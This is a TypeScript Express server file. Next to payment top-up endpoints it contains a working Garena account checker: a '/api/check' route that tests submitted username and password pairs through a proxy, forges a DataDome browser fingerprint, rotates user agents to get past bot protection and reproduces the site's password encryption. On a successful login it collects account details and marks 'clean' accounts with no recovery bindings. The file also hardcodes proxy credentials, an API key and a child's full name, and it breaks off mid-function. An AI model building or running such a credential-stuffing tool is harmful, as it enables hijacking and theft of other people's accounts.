import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import cors from 'cors';
import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import crypto from 'node:crypto';
import { fileURLToPath } from 'url';
import https from 'node:https';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';
import rateLimit from 'express-rate-limit';

dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Initialize Supabase Admin client
const supabaseUrl = process.env.VITE_SUPABASE_URL || 'https://ryybzmtkoeyfxecclqrr.supabase.co/';
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY || 'no-key-provided-please-check-env';

if (supabaseServiceKey === 'no-key-provided-please-check-env') {
  console.warn('SUPABASE_SERVICE_ROLE_KEY is missing! Backend DB operations will fail.');
}

const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey || '', {
  auth: {
    autoRefreshToken: false,
    persistSession: false
  }
});

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json({ limit: '10mb' }));
  app.use(express.urlencoded({ limit: '10mb', extended: true }));

  // Logging middleware for debugging
  app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
  });

  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
  });

  app.post('/api/topup/truemoney', async (req, res) => {
    try {
      const { voucherCode, phone } = req.body;
      
      if (!voucherCode || !phone) {
        return res.status(400).json({ success: false, error: 'ข้อมูลไม่ครบถ้วน' });
      }

      console.log(`Checking voucherCode: ${voucherCode} for phone: ${phone}`);

      const response = await axios.post(
          `https://gift.truemoney.com/campaign/vouchers/${voucherCode}/redeem`,
          {
              mobile: phone,
              voucher_hash: voucherCode
          },
          {
              headers: {
                  "Accept": "application/json",
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
                  "Content-Type": "application/json",
                  "Origin": "https://gift.truemoney.com",
                  "Accept-Language": "en-US,en;q=0.9",
                  "Connection": "keep-alive"
              }
          }
      );

      const redeemData = response.data;

      if (redeemData.status.code === "SUCCESS") {
          const amount = redeemData.data.my_ticket.amount_baht;
          return res.json({ success: true, amount });
      } else {
          return res.json({ success: false, error: redeemData.status.message || 'ไม่สามารถรับเงินได้' });
      }
    } catch (error: any) {
        if (error.response) {
            const errorCode = error.response.data?.status?.code || 'UNKNOWN';
            const errorMessage = error.response.data?.status?.message || 'ไม่ทราบสาเหตุ';
            return res.json({ success: false, error: `ไม่สามารถรับซองได้: ${errorCode} - ${errorMessage}` });
        } else {
            console.error("TrueMoney API Error:", error.message);
            return res.status(500).json({ success: false, error: 'เกิดข้อผิดพลาดในการเชื่อมต่อเครือข่าย' });
        }
    }
  });

  const usedSlips = new Set<string>();

  app.post('/api/topup/slip', async (req, res) => {
    try {
      const { imageBase64 } = req.body;
      if (!imageBase64) {
        return res.status(400).json({ success: false, error: 'ข้อมูลไม่ครบถ้วน' });
      }

      const imageBuffer = Buffer.from(imageBase64, 'base64');
      const blob = new Blob([imageBuffer], { type: 'image/jpeg' });
      const form = new FormData();
      form.append('files', blob, 'slip.jpg');

      const response = await axios.post(
        'https://api.slipok.com/api/line/apikey/65331',
        form,
        {
          headers: {
            'x-authorization': 'SLIPOKA9ZEE71'
          }
        }
      );

      // Checking response format from SlipOK
      if (response.data.success === true || response.data.code === '0000' || response.data.data?.amount !== undefined) {
        const amount = response.data.data?.amount;
        const transRef = response.data.data?.transRef;
        const receiverProxy = response.data.data?.receiver?.proxy?.value || '';
        const receiverName = response.data.data?.receiver?.displayName || response.data.data?.receiver?.name || '';
        
        const EXPECTED_SHOP_NAME_1 = "ด.ช. กรวิชญ์ มาตขาว";
        const EXPECTED_SHOP_NAME_2 = "Master Korawit Makthaw";
        
        // ตรวจสอบชื่อบัญชีร้าน
        const isMatch = receiverName.includes(EXPECTED_SHOP_NAME_1) || 
                        receiverName.toUpperCase().includes(EXPECTED_SHOP_NAME_2.toUpperCase()) ||
                        receiverName.includes("กรวิชญ์");
        
        if (!isMatch) {
            return res.json({ 
              success: false, 
              error: `ชื่อบัญชีผู้รับเงินไม่สมบูรณ์ (สลิปโอนไปที่: ${receiverName || 'ไม่ระบุ'}) ไม่ตรงกับชื่อบัญชีของทางร้าน กรุณาติดต่อแอดมิน` 
            });
        }
        
        if (transRef) {
          if (usedSlips.has(transRef)) {
            return res.json({ success: false, error: 'สลิปนี้ถูกใช้งานไปแล้ว' });
          }
          usedSlips.add(transRef);
        }

        return res.json({ success: true, amount });
      } else {
        const errorMsg = response.data.data?.message || response.data.message;
        return res.json({ success: false, error: errorMsg || 'ไม่สามารถรับเงินได้' });
      }
    } catch (error: any) {
        if (error.response) {
            const errorMsg = error.response.data?.message;
            return res.json({ success: false, error: errorMsg || 'สลิปไม่ถูกต้อง หรือถูกใช้งานไปแล้ว' });
        } else {
            console.error("SlipOK API Error:", error.message);
            return res.status(500).json({ success: false, error: 'เกิดข้อผิดพลาดในการเชื่อมต่อเครือข่าย' });
        }
    }
  });

  app.post('/api/verify_turnstile', async (req, res) => {
    try {
      const { token } = req.body;
      const secretKey = process.env.TURNSTILE_SECRET_KEY || '1x0000000000000000000000000000000AA';

      console.log('Verify Turnstile called with token:', token);
      
      if (!token) {
        return res.status(400).json({ success: false, error: 'Token missing' });
      }

      const params = new URLSearchParams();
      params.append('secret', secretKey);
      params.append('response', token);

      const response = await axios.post(
        'https://challenges.cloudflare.com/turnstile/v0/siteverify',
        params.toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true
        }
      );

      console.log('Turnstile Response:', response.data);
      
      if (!response.data.success) {
        return res.status(403).json(response.data);
      }
      return res.json(response.data);
    } catch (error: any) {
      console.error('Turnstile verification error:', error.message || error);
      return res.status(500).json({ success: false, error: 'Internal server error', detail: error.message });
    }
  });

    // --- Precise Garena Checking Logic using node:crypto ---
  
  const getMD5 = (text: string) => {
    let raw = text;
    try {
      if (text.includes('%')) {
        raw = decodeURIComponent(text);
      }
    } catch (e) {}
    return crypto.createHash('md5').update(raw).digest('hex');
  };

  const encryptPassword = (password: string, v1: string, v2: string) => {
    const passMd5 = getMD5(password);
    const innerHash = crypto.createHash('sha256').update(passMd5 + v1).digest('hex');
    const outerHash = crypto.createHash('sha256').update(innerHash + v2).digest('hex');
    const key = Buffer.from(outerHash, 'hex');
    const plaintext = Buffer.from(passMd5, 'hex');
    const cipher = crypto.createCipheriv('aes-256-ecb', key, null);
    cipher.setAutoPadding(false);
    let encrypted = cipher.update(plaintext);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted.toString('hex').substring(0, 32);
  };

  const getCodmInfo = async (client: any) => {
    try {
      const random_id = Date.now().toString();
      const token_url = "https://auth.garena.com/oauth/token/grant";
      const token_data = `client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=${random_id}`;
      
      const token_res = await client.post(token_url, token_data, {
        headers: {
          "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
          "Content-Type": "application/x-www-form-urlencoded",
          "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
      });
      
      const access_token = token_res.data.access_token;
      if (!access_token) return null;

      // Callback to CODM
      const codm_callback_url = `https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token=${access_token}`;
      await client.get(codm_callback_url, { maxRedirects: 0, validateStatus: (s: number) => s < 400 });

      // API callback
      const api_callback_url = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${access_token}`;
      const api_callback_res = await client.get(api_callback_url, { maxRedirects: 0, validateStatus: (s: number) => s < 400 });
      const location = api_callback_res.headers['location'] || '';

      if (location.includes("err=3")) return null;
      if (location.includes("token=")) {
        const token = location.split("token=")[1].split('&')[0];
        const check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/";
        const check_res = await client.get(check_login_url, {
          headers: {
            "codm-delete-token": token,
            "Referer": "https://delete-request.codm.garena.co.id/"
          }
        });
        
        const user_data = check_res.data.user;
        if (user_data) {
          return {
            nickname: user_data.codm_nickname || 'N/A',
            level: user_data.codm_level || 'Unknown',
            region: user_data.region || 'N/A',
            uid: user_data.uid || 'N/A',
            open_id: user_data.open_id || 'N/A',
            t_open_id: user_data.t_open_id || 'N/A'
          };
        }
      }
    } catch (e) {
      // console.error("CODM Info Fetch Error:", e.message);
    }
    return null;
  };

  const getGameConnections = async (client: any) => {
    const game_info: string[] = [];
    const valid_regions = ['sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'];
    
    const game_mappings: any = {
      'tw': {
          "100082": "CODM",
          "100067": "FREE FIRE",
          "100070": "SPEED DRIFTERS",
          "100130": "BLACK CLOVER M",
          "100105": "GARENA UNDAWN",
          "100050": "ROV",
          "100151": "DELTA FORCE",
          "100147": "FAST THRILL",
          "100107": "MOONLIGHT BLADE"
      },
      'th': {
          "100067": "FREEFIRE",
          "100055": "ROV",
          "100082": "CODM",
          "100151": "DELTA FORCE",
          "100105": "GARENA UNDAWN",
          "100130": "BLACK CLOVER M",
          "100070": "SPEED DRIFTERS",
          "32836": "FC ONLINE",
          "100071": "FC ONLINE M",
          "100124": "MOONLIGHT BLADE"
      },
      'vn': {
          "32837": "FC ONLINE",
          "100072": "FC ONLINE M",
          "100054": "ROV",
          "100137": "THE WORLD OF WAR"
      },
      'default': {
          "100082": "CODM",
          "100067": "FREEFIRE",
          "100151": "DELTA FORCE",
          "100105": "GARENA UNDAWN",
          "100057": "AOV",
          "100070": "SPEED DRIFTERS",
          "100130": "BLACK CLOVER M",
          "100055": "ROV"
      }
    };

    try {
      const token_url = "https://authgop.garena.com/oauth/token/grant";
      const token_data = `client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id=${Date.now()}`;
      const token_res = await client.post(token_url, token_data, {
        headers: { 
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
          "Content-Type": "application/x-www-form-urlencoded" 
        }
      });
      const access_token = token_res.data.access_token;
      if (!access_token) return [];

      const inspect_url = "https://shop.garena.sg/api/auth/inspect_token";
      const inspect_res = await client.post(inspect_url, { token: access_token }, {
          headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
              "Content-Type": "application/json"
          }
      });

      const session_key_roles = inspect_res.headers['set-cookie']?.find((c: string) => c.startsWith('session_key='))?.split(';')[0]?.split('=')[1] || inspect_res.cookies?.session_key;
      
      const uac = (inspect_res.data.uac || "ph").toLowerCase();
      const region = valid_regions.includes(uac) ? uac : 'ph';
      
      let base_domain = `shop.garena.${region}`;
      if (region === 'th' || region === 'in') base_domain = "termgame.com";
      else if (region === 'id') base_domain = "kiosgamer.co.id";
      else if (region === 'vn') base_domain = "napthe.vn";

      const applicable_games = game_mappings[region] || game_mappings['default'];
      for (const [app_id, game_name] of Object.entries(applicable_games)) {
        try {
          const roles_res = await client.get(`https://${base_domain}/api/shop/apps/roles`, {
            params: { app_id },
            headers: {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Referer': `https://${base_domain}/?app=${app_id}`
            }
          });
          const roles_data = roles_res.data;
          let role = null;
          if (Array.isArray(roles_data.role) && roles_data.role.length > 0) role = roles_data.role[0];
          else if (roles_data[app_id] && Array.isArray(roles_data[app_id]) && roles_data[app_id].length > 0) role = roles_data[app_id][0].role;

          if (role) game_info.push(`[${region.toUpperCase()} - ${game_name} - ${role}]`);
        } catch (e) {}
      }
      
      if (game_info.length === 0) {
          game_info.push(`[${region.toUpperCase()} - No Game Detected]`);
      }
    } catch (e) {}
    return game_info;
  };

  // Add RateLimiting to prevent bot attacks
  const checkLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
    legacyHeaders: false, // Disable the `X-RateLimit-*` headers
    message: { error: 'ขออภัย คุณส่งคำร้องขอเยอะเกินไป (Anti-Bot Protection) กรุณารอสักครู่' }
  });

  // Cache for Turnstile tokens (since they are single-use against Cloudflare, but we need them for a bulk loop)
  const turnstileCache = new Map<string, number>();

  app.post('/api/check', checkLimiter, async (req, res) => {
    const account = req.body.account?.toString().trim();
    const password = req.body.password?.toString().trim();
    const turnstileToken = req.body.turnstileToken; // Optional turnstile token

    if (!account || !password) return res.status(400).json({ error: 'Missing credentials' });

    // Verify Turnstile Token
    if (!turnstileToken) {
       return res.status(403).json({ error: 'Missing Captcha token. Please refresh the page and verify you are human.' });
    }

    // Since a batch check loop uses the same token, we cache verified tokens for 5 minutes
    const now = Date.now();
    const cachedTime = turnstileCache.get(turnstileToken);
    
    if (cachedTime && (now - cachedTime < 5 * 60 * 1000)) {
       // Token is already verified and within 5 minute window
       // console.log("Used cached Turnstile token bypass");
    } else {
       const secretKey = process.env.TURNSTILE_SECRET_KEY || '1x0000000000000000000000000000000AA';
       
       try {
         const params = new URLSearchParams();
         params.append('secret', secretKey);
         params.append('response', turnstileToken);

         const turnstileResponse = await axios.post(
           'https://challenges.cloudflare.com/turnstile/v0/siteverify',
           params,
           {
             headers: {
               'Content-Type': 'application/x-www-form-urlencoded'
             }
           }
         );

         if (!turnstileResponse.data.success) {
           console.error('Turnstile verification failed:', turnstileResponse.data);
           return res.status(403).json({ error: 'Turnstile verification failed. Please refresh the page and try again.' });
         }

         // Cache the successfully verified token
         turnstileCache.set(turnstileToken, now);
         
         // Clean up old entries from cache every once in a while
         if (turnstileCache.size > 1000) {
           for (const [key, time] of turnstileCache.entries()) {
             if (now - time > 5 * 60 * 1000) {
               turnstileCache.delete(key);
             }
           }
         }
       } catch (error) {
         console.error('Error verifying Turnstile token:', error);
         return res.status(500).json({ error: 'Internal server error during captcha verification.' });
       }
    }

    const jar = new CookieJar();
    
    // User-Agent Pool for basic rotation
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const isEdge = randomUserAgent.includes('Edg/');
    const isMac = randomUserAgent.includes('Mac OS');
    const chromeVer = randomUserAgent.match(/Chrome\/(\d+)\./)?.[1] || '130';
    
    let secChUa = isEdge 
      ? `"Chromium";v="${chromeVer}", "Microsoft Edge";v="${chromeVer}", "Not?A_Brand";v="99"`
      : `"Chromium";v="${chromeVer}", "Google Chrome";v="${chromeVer}", "Not?A_Brand";v="99"`;
    let secChPlatform = isMac ? '"macOS"' : '"Windows"';

    // Webshare Proxy provided by user
    const proxyUrl = `http://hfbbfxvi:dn64aepbgf6n@31.59.20.176:6754`;
    
    let agent;
    try {
      if (proxyUrl) {
        // 20s timeout so the proxy fails BEFORE the platform (Cloud Run/Nginx) 60s limit
        agent = new HttpsProxyAgent(proxyUrl, { timeout: 20000, rejectUnauthorized: false } as any);
      } else {
        agent = new https.Agent({ rejectUnauthorized: false });
      }
    } catch (err) {
      console.error('Failed to initialize proxy agent:', err);
      agent = new https.Agent({ rejectUnauthorized: false });
    }

    
    const controller = new AbortController();
    // 25s hard limit for the whole route to ensure we respond with JSON before platform drop
    const timeoutId = setTimeout(() => controller.abort(), 25000); 

    
    // Make sure we clear the timeout when the request closes or route returns
    res.on('finish', () => clearTimeout(timeoutId));
    res.on('close', () => clearTimeout(timeoutId));

    const axiosConfig: any = { 
      headers: {
        'User-Agent': randomUserAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
        'Referer': 'https://sso.garena.com/'
      },
      httpsAgent: agent,
      httpAgent: agent,
      proxy: false,
      timeout: 20000,
      signal: controller.signal,
      validateStatus: (status: number) => status < 500
    };
    const client = axios.create(axiosConfig);

    // Manual Cookie Management to avoid HttpsProxyAgent conflict with axios-cookiejar-support
    client.interceptors.request.use(async (config) => {
      try {
        const url = config.url || '';
        const cookie = await jar.getCookieString(url.startsWith('http') ? url : (config.baseURL || '') + url);
        if (cookie) {
          if (config.headers && typeof config.headers.set === 'function') {
            try {
              config.headers.set('Cookie', cookie);
            } catch (ignore) {}
          } else if (config.headers) {
            try {
              (config.headers as any)['Cookie'] = cookie;
            } catch (ignore) {}
          }
        }
      } catch (e) {
        console.error("Cookie request interceptor error:", e);
      }
      return config;
    }, (error) => Promise.reject(error));

    client.interceptors.response.use(async (response) => {
      try {
        const setCookies = response.headers['set-cookie'];
        if (setCookies) {
          const url = response.config.url || '';
          const targetUrl = url.startsWith('http') ? url : (response.config.baseURL || '') + url;
          for (const cookieStr of setCookies) {
            await jar.setCookie(cookieStr, targetUrl);
          }
        }
      } catch (e) {
        console.error("Cookie response interceptor error:", e);
      }
      return response;
    }, (error) => Promise.reject(error));

    try {
      // 1. Precise DataDome Handshake with updated fingerprint
      const ddPayloadObj = {
        "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536,
        "ua": randomUserAgent,
        "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false,
        "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864,
        "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US",
        "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true,
        "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true, "plgre": true,
        "plgof": false, "plggt": false, "pltod": false, "hcovdr": false, "hcovdr2": false,
        "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false, "lb": false,
        "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false, "vnd": "Google Inc.",
        "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
        "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined", "aco": "probably",
        "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably", "acwts": false,
        "acma": "maybe", "acmats": false, "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false,
        "acmp4": "maybe", "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe",
        "acwmts": false, "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true,
        "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "", "vcmpts": false,
        "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true, "dvm": 8, "sqt": false,
        "so": "landscape-primary", "bda": false, "wdw": true, "prm": true, "tzp": true, "cvs": true,
        "usb": true, "cap": true, "tbf": false, "lgs": true, "tpd": true
      };
      
      const payloadParams = new URLSearchParams();
      payloadParams.append('jsData', JSON.stringify(ddPayloadObj));
      payloadParams.append('eventCounters', '[]');
      payloadParams.append('jsType', 'ch');
      payloadParams.append('cid', 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae');
      payloadParams.append('ddk', 'AE3F04AD3F0D3A462481A337485081');
      payloadParams.append('Referer', 'https://account.garena.com/');
      payloadParams.append('request', '/');
      payloadParams.append('responsePage', 'origin');
      payloadParams.append('ddv', '4.35.4');
      
      const ddPayload = payloadParams.toString();

      console.log('--- Calling DataDome ---');
      const ddRes = await client.post('https://dd.garena.com/js/', ddPayload, {
        headers: { 
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://account.garena.com',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': randomUserAgent
        }
      });
      console.log('--- DataDome Done ---');

      if (ddRes.data && ddRes.data.cookie) {
        const ddCookieParts = ddRes.data.cookie.split(';');
        const ddCookieValue = ddCookieParts[0];
        await jar.setCookie(ddCookieValue, 'https://sso.garena.com');
      }

      // Small delay to simulate human-like transition
      await new Promise(r => setTimeout(r, 800 + Math.random() * 500));

      let usedDirectClient = false;
      let directClient;
      let preloginRes;

      if (ddRes.status === 403) {
        console.log('--- DataDome Proxy 403. Skipping proxy Prelogin. ---');
        preloginRes = { status: 403 };
      } else {
        // 2. Prelogin Challenge with enhanced headers
        console.log('--- Calling Prelogin ---');
        preloginRes = await client.get('https://sso.garena.com/api/prelogin', {
          params: { app_id: '10100', account, format: 'json', id: Date.now() },
          headers: {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'host': 'sso.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': randomUserAgent
          }
        });
        console.log('--- Prelogin Done ---');
      }

      if (preloginRes.status === 403) {
        console.log('--- Proxy 403. Trying DIRECT connection (No Proxy) ---');
        // Fallback to Server IP
        usedDirectClient = true;
        const directAgent = new https.Agent({ rejectUnauthorized: false });
        directClient = axios.create({ ...axiosConfig, httpsAgent: directAgent, httpAgent: directAgent });
        
        // Attach same cookie jar logic
        directClient.interceptors.request.use(async (config) => {
          try {
            const url = config.url || '';
            const cookie = await jar.getCookieString(url.startsWith('http') ? url : (config.baseURL || '') + url);
            if (cookie) {
              if (config.headers && typeof config.headers.set === 'function') config.headers.set('Cookie', cookie);
              else if (config.headers) (config.headers as any)['Cookie'] = cookie;
            }
          } catch (e) {}
          return config;
        }, (e) => Promise.reject(e));

        directClient.interceptors.response.use(async (response) => {
          try {
            const setCookies = response.headers['set-cookie'];
            if (setCookies) {
              const targetUrl = response.config.url?.startsWith('http') ? response.config.url : (response.config.baseURL || '') + (response.config.url || '');
              for (const cookieStr of setCookies) await jar.setCookie(cookieStr, targetUrl);
            }
          } catch (e) {}
          return response;
        }, (e) => Promise.reject(e));

        jar.removeAllCookiesSync();

        console.log('--- Calling DataDome (Direct) ---');
        const fallbackDdRes = await directClient.post('https://dd.garena.com/js/', ddPayload, {
          headers: { 
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': randomUserAgent
          }
        });

        if (fallbackDdRes.data && fallbackDdRes.data.cookie) {
          const ddCookieParts = fallbackDdRes.data.cookie.split(';');
          const ddCookieValue = ddCookieParts[0];
          await jar.setCookie(ddCookieValue, 'https://sso.garena.com');
        }

        preloginRes = await directClient.get('https://sso.garena.com/api/prelogin', {
          params: { app_id: '10100', account, format: 'json', id: Date.now() },
          headers: {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'host': 'sso.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': randomUserAgent
          }
        });
        
        if (preloginRes.status === 403) {
           return res.json({ success: false, error: 'ระบบ Garena ป้องกันการเข้าถึงบัญชี (403) แนะนำให้เปลี่ยน Proxy หรือหยุดพัก' });
        }
      }

      const { v1, v2, error: preError } = preloginRes.data;
      if (preError) return res.json({ success: false, error: `Account Error: ${preError}` });
      if (!v1 || !v2) {
        console.error("Prelogin Debug Data:", JSON.stringify(preloginRes.data));
        if (preloginRes.data && (preloginRes.data.captcha || (preloginRes.data.url && preloginRes.data.url.includes('captcha')))) {
          return res.json({ success: false, error: 'ระบบตรวจพบโปรแกรมอัตโนมัติ (DataDome / Captcha). กรุณาเปลี่ยน Proxy' });
        }
        return res.json({ success: false, error: 'Challenge failed (Empty v1/v2). Garena structure might have changed.' });
      }

      // 3. SSO Login Attempt
      console.log('--- Calling SSO Login ---');
      const hashedPassword = encryptPassword(password, v1, v2);
      const activeClient = usedDirectClient ? directClient : client;
      
      const loginRes = await activeClient.get('https://sso.garena.com/api/login', {
        params: {
          app_id: '10100', account, password: hashedPassword,
          redirect_uri: 'https://account.garena.com/',
          format: 'json', id: Date.now()
        },
        headers: {
          'accept': 'application/json, text/plain, */*',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'user-agent': randomUserAgent
        }
      });
      console.log('--- Login Done ---');

      const loginData = loginRes.data;
      if (loginData.error) {
        const errorMsg = loginData.error === 'error_auth' ? 'รหัสผ่านผิด' : 
                        loginData.error === 'error_not_exist' ? 'ไม่พบไอดีนี้' : 
                        loginData.error;
        return res.json({ success: false, error: errorMsg });
      }

      // 4. Successful Login - Fetch Info
      console.log('--- Calling Account Init ---');
      const initRes = await activeClient.get('https://account.garena.com/api/account/init', {
        headers: { 
          'accept': '*/*',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'user-agent': randomUserAgent
        }
      });
      console.log('--- Account Init Done ---');      
      const resData = initRes.data || {};
      const userData = resData.user_info || resData || {};
      
      const binds = [];
      if (userData.email && userData.email !== 'N/A') binds.push('Email');
      if (userData.mobile_no && userData.mobile_no !== 'N/A') binds.push('Phone');
      if (userData.is_fbconnect_enabled) binds.push('Facebook');
      if (userData.idcard && userData.idcard !== 'N/A') binds.push('ID Card');
      
      const isClean = binds.length === 0;

      // 5. Fetch CODM & Game Info
      const [codmInfo, gameConnections] = await Promise.all([
        getCodmInfo(activeClient),
        getGameConnections(activeClient)
      ]);

      return res.json({
        success: true,
        data: {
          account, password, uid: userData.uid || 'N/A',
          shells: userData.shell || 0,
          level: codmInfo?.level || 0, 
          rank: 'Success', 
          isClean,
          phoneBound: !!(userData.mobile_no && userData.mobile_no !== 'N/A'),
          emailVerified: !!userData.email_v,
          fbLinked: !!userData.is_fbconnect_enabled,
          region: userData.acc_country || 'TH',
          otherGames: gameConnections || [],
          codmNickname: codmInfo?.nickname || 'N/A',
          idCardBound: !!(userData.idcard && userData.idcard !== 'N/A')
        }
      });

    } catch (err: any) {
      const errMsg = err?.message || '';
      if (!['ECONNREFUSED', 'canceled', 'CanceledError', 'AbortError'].some(e => errMsg.includes(e) || err?.name === e || err?.code === e)) {
         console.error("Garena API Error:", errMsg || err);
      }
      let errorMsg = 'Network Error: ' + (errMsg || 'Unknown Error');
      
      if (err?.code === 'ECONNABORTED' || errMsg.includes('timeout') || err?.code === 'ETIMEDOUT') {
        errorMsg = 'การเชื่อมต่อหมดเวลา (Timeout). อาจเกิดจาก Proxy ช้าหรือใช้งานไม่ได้ (ภายใน 30 วินาที)';
      } else if (err?.name === 'AbortError' || err?.code === 'ERR_CANCELED' || err?.name === 'CanceledError' || errMsg === 'canceled') {
        errorMsg = 'การเชื่อมต่อถูกยกเลิก (ใช้เวลาเกิน 90 วินาที). Proxy ช้าเกินไป หรือค้าง';
      } else if (err?.code === 'ECONNRESET') {
        errorMsg = 'การเชื่อมต่อถูกตัด (ECONNRESET). โปรดเปลี่ยน Proxy หรือลองใหม่อีกครั้ง';
      } else if (errMsg.includes('disconnected') || errMsg.includes('TLS')) {
